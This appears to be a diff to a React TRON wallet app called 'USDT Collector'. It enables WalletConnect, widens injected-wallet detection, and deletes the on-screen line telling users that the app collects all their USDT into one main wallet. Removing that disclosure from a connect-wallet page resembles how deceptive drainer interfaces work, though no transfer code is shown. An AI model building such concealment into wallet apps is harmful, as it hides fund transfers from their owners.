@@ -33,6 +33,7 @@ createAppKit({
   adapters: [tronAdapter],
   networks: [NETWORK === "Mainnet" ? tronMainnet : tronShastaTestnet],
   projectId: WC_PROJECT_ID,
+  enableWalletConnect: true,
   metadata: {
     name: 'USDT Collector',
     description: 'Collect USDT from multiple wallets to one main wallet',
@@ -84,7 +85,7 @@ export default function App() {
 
   // Auto-detect injected wallet (TronLink / Trust in-app)
   useEffect(() => {
-    const tw = window.tronLink?.tronWeb
+    const tw = window.tronWeb || window.tronLink?.tronWeb
     if (tw?.defaultAddress?.base58 && typeof tw.defaultAddress.base58 === 'string') {
       setTronWeb(tw)
       setWalletAddress(tw.defaultAddress.base58)
@@ -157,7 +158,6 @@ export default function App() {
           {!walletAddress ? (
             <div className="text-center">
               <h2 className="text-5xl font-bold mb-3">Send USDT</h2>
-              <p className="text-zinc-400 mb-10">Collect all USDT from your wallets to one main wallet</p>
 
               <button
                 onClick={handleConnect}
